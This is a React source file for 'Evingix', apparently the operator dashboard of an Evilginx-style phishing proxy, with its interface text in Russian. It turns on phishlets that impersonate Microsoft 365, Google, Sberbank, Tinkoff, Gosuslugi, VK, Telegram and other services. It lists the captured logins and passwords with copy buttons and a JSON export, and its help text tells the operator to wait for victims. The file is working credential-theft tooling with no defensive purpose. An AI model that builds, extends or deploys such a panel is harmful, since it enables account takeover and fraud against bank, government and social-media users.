'use client'

import { useState, useEffect, useCallback } from 'react'
import { 
  Shield, Activity, Users, Key, AlertTriangle, CheckCircle, 
  Settings, Play, Pause, Trash2, Download, RefreshCw,
  Globe, Copy, ArrowRight, HelpCircle, ChevronDown
} from 'lucide-react'

// Types
interface Stats {
  total_sessions: number
  active_sessions: number
  total_credentials: number
  active_phishlets: number
}

interface Credential {
  id: string
  username: string
  password: string
  captured_at: string
}

interface Phishlet {
  id: string
  name: string
  enabled: boolean
}

// API
async function apiCall(endpoint: string, options?: RequestInit) {
  const response = await fetch(`/api/v1${endpoint}`, {
    ...options,
    headers: { 'Content-Type': 'application/json', ...options?.headers },
  })
  if (!response.ok) throw new Error(`Error: ${response.statusText}`)
  return response.json()
}

export default function SimplePanel() {
  const [loading, setLoading] = useState(true)
  const [stats, setStats] = useState<Stats | null>(null)
  const [credentials, setCredentials] = useState<Credential[]>([])
  const [phishlets, setPhishlets] = useState<Phishlet[]>([])
  const [showHelp, setShowHelp] = useState(false)
  const [activePhishlets, setActivePhishlets] = useState<string[]>([])

  const fetchData = useCallback(async () => {
    try {
      const [statsData, credsData, phishletsData] = await Promise.all([
        apiCall('/stats'),
        apiCall('/credentials?limit=50'),
        apiCall('/phishlets'),
      ])
      setStats(statsData)
      setCredentials(credsData.credentials || [])
      setPhishlets(phishletsData.phishlets || [])
      setActivePhishlets(phishletsData.phishlets?.filter((p: Phishlet) => p.enabled)?.map((p: Phishlet) => p.id) || [])
    } catch (err) {
      console.error(err)
    } finally {
      setLoading(false)
    }
  }, [])

  useEffect(() => {
    fetchData()
    const interval = setInterval(fetchData, 5000)
    return () => clearInterval(interval)
  }, [fetchData])

  const togglePhishlet = async (id: string, enabled: boolean) => {
    try {
      await apiCall(`/phishlets/${id}/${enabled ? 'disable' : 'enable'}`, { method: 'POST' })
      fetchData()
    } catch (err) {
      console.error(err)
    }
  }

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
  }

  const exportData = () => {
    const data = JSON.stringify(credentials, null, 2)
    const blob = new Blob([data], { type: 'application/json' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `credentials_${new Date().toISOString().split('T')[0]}.json`
    a.click()
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 flex items-center justify-center">
        <div className="text-center">
          <Shield className="w-16 h-16 text-blue-500 mx-auto mb-4 animate-pulse" />
          <p className="text-blue-400">Загрузка...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 text-white">
      {/* Header */}
      <header className="bg-white/10 backdrop-blur-sm border-b border-white/10 px-6 py-4">
        <div className="max-w-5xl mx-auto flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <Shield className="w-8 h-8 text-blue-400" />
            <div>
              <h1 className="text-lg font-bold">Evingix</h1>
              <p className="text-xs text-slate-400">Простая панель управления</p>
            </div>
          </div>
          <div className="flex items-center space-x-3">
            <button 
              onClick={fetchData}
              className="p-2 hover:bg-white/10 rounded-lg transition-colors"
              title="Обновить"
            >
              <RefreshCw className="w-5 h-5" />
            </button>
            <button 
              onClick={() => setShowHelp(!showHelp)}
              className="p-2 hover:bg-white/10 rounded-lg transition-colors"
              title="Помощь"
            >
              <HelpCircle className="w-5 h-5" />
            </button>
          </div>
        </div>
      </header>

      {/* Help Panel */}
      {showHelp && (
        <div className="bg-blue-900/30 border-b border-blue-500/30 px-6 py-4">
          <div className="max-w-5xl mx-auto">
            <h3 className="font-semibold mb-2">📖 Как пользоваться панелью</h3>
            <div className="grid md:grid-cols-3 gap-4 text-sm text-slate-300">
              <div>
                <p className="font-medium text-white mb-1">1. Запустите фишлет</p>
                <p>Нажмите кнопку "Запустить" на нужном фишлете ниже</p>
              </div>
              <div>
                <p className="font-medium text-white mb-1">2. Ждите жертв</p>
                <p>Когда жертва введет данные, они появятся в разделе "Данные"</p>
              </div>
              <div>
                <p className="font-medium text-white mb-1">3. Скопируйте данные</p>
                <p>Нажмите на 🔵 чтобы скопировать логин или пароль</p>
              </div>
            </div>
          </div>
        </div>
      )}

      <main className="max-w-5xl mx-auto px-6 py-8">
        {/* Stats */}
        <div className="grid grid-cols-3 gap-4 mb-8">
          <div className="bg-white/10 rounded-xl p-4 text-center">
            <Users className="w-6 h-6 mx-auto mb-2 text-blue-400" />
            <p className="text-2xl font-bold">{stats?.total_sessions || 0}</p>
            <p className="text-xs text-slate-400">Всего сессий</p>
          </div>
          <div className="bg-white/10 rounded-xl p-4 text-center">
            <Key className="w-6 h-6 mx-auto mb-2 text-green-400" />
            <p className="text-2xl font-bold">{stats?.total_credentials || 0}</p>
            <p className="text-xs text-slate-400">Перехвачено данных</p>
          </div>
          <div className="bg-white/10 rounded-xl p-4 text-center">
            <Globe className="w-6 h-6 mx-auto mb-2 text-purple-400" />
            <p className="text-2xl font-bold">{activePhishlets.length}</p>
            <p className="text-xs text-slate-400">Активных целей</p>
          </div>
        </div>

        {/* Phishlets */}
        <section className="mb-8">
          <h2 className="text-lg font-semibold mb-4 flex items-center space-x-2">
            <Globe className="w-5 h-5" />
            <span>Выберите цель для фишинга</span>
          </h2>
          <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
            {phishlets.map((phishlet) => (
              <button
                key={phishlet.id}
                onClick={() => togglePhishlet(phishlet.id, phishlet.enabled)}
                className={`p-4 rounded-xl text-left transition-all ${
                  phishlet.enabled 
                    ? 'bg-green-500/20 border-2 border-green-500/50' 
                    : 'bg-white/5 hover:bg-white/10 border-2 border-transparent'
                }`}
              >
                <div className="flex items-center justify-between mb-2">
                  <span className="text-2">{getPhishletEmoji(phishlet.name)}</span>
                  {phishlet.enabled && <span className="text-xs text-green-400">Активен</span>}
                </div>
                <p className="font-medium text-sm">{getPhishletName(phishlet.name)}</p>
              </button>
            ))}
          </div>
        </section>

        {/* Credentials */}
        <section>
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-lg font-semibold flex items-center space-x-2">
              <Key className="w-5 h-5" />
              <span>Перехваченные данные</span>
            </h2>
            {credentials.length > 0 && (
              <button 
                onClick={exportData}
                className="flex items-center space-x-2 px-4 py-2 bg-green-600 hover:bg-green-700 rounded-lg text-sm transition-colors"
              >
                <Download className="w-4 h-4" />
                <span>Скачать</span>
              </button>
            )}
          </div>

          {credentials.length > 0 ? (
            <div className="space-y-2">
              {credentials.map((cred) => (
                <div key={cred.id} className="bg-white/5 rounded-xl p-4 flex items-center justify-between">
                  <div className="flex-1 grid md:grid-cols-2 gap-4">
                    <div>
                      <p className="text-xs text-slate-500 mb-1">Логин</p>
                      <div className="flex items-center space-x-2">
                        <code className="text-blue-400">{cred.username}</code>
                        <button 
                          onClick={() => copyToClipboard(cred.username)}
                          className="p-1 hover:bg-white/10 rounded"
                        >
                          <Copy className="w-3 h-3" />
                        </button>
                      </div>
                    </div>
                    <div>
                      <p className="text-xs text-slate-500 mb-1">Пароль</p>
                      <div className="flex items-center space-x-2">
                        <code className="text-green-400">{cred.password}</code>
                        <button 
                          onClick={() => copyToClipboard(cred.password)}
                          className="p-1 hover:bg-white/10 rounded"
                        >
                          <Copy className="w-3 h-3" />
                        </button>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-500 ml-4">
                    {new Date(cred.captured_at).toLocaleString('ru-RU')}
                  </p>
                </div>
              ))}
            </div>
          ) : (
            <div className="bg-white/5 rounded-xl p-8 text-center">
              <Key className="w-12 h-12 text-slate-600 mx-auto mb-3" />
              <p className="text-slate-400">Пока нет данных</p>
              <p className="text-sm text-slate-500 mt-1">Запустите фишлет и ждите жертв</p>
            </div>
          )}
        </section>
      </main>

      {/* Footer */}
      <footer className="border-t border-white/10 py-4 text-center text-sm text-slate-500">
        <p>Evingix Control Panel • Обновляется автоматически</p>
      </footer>
    </div>
  )
}

function getPhishletName(name: string): string {
  const names: Record<string, string> = {
    microsoft_365: 'Microsoft 365',
    google_workspace: 'Google Workspace',
    sberbank: 'Сбербанк',
    sberbank_business: 'Сбербанк Бизнес',
    tinkoff_business: 'Тинькофф',
    gosuslugi: 'Госуслуги',
    yandex: 'Яндекс',
    vk: 'ВКонтакте',
    telegram: 'Telegram',
    instagram: 'Instagram',
    mailru: 'Mail.ru',
    ozon: 'Ozon',
    wildberries: 'Wildberries',
    tiktok: 'TikTok',
    facebook: 'Facebook',
  }
  return names[name] || name
}

function getPhishletEmoji(name: string): string {
  const emojis: Record<string, string> = {
    microsoft_365: '📧',
    google_workspace: '📧',
    sberbank: '🏦',
    sberbank_business: '🏦',
    tinkoff_business: '🏦',
    gosuslugi: '🏛️',
    yandex: '🔍',
    vk: '💬',
    telegram: '✈️',
    instagram: '📷',
    mailru: '📧',
    ozon: '🛒',
    wildberries: '🛒',
    tiktok: '🎵',
    facebook: '📘',
  }
  return emojis[name] || '🌐'
}
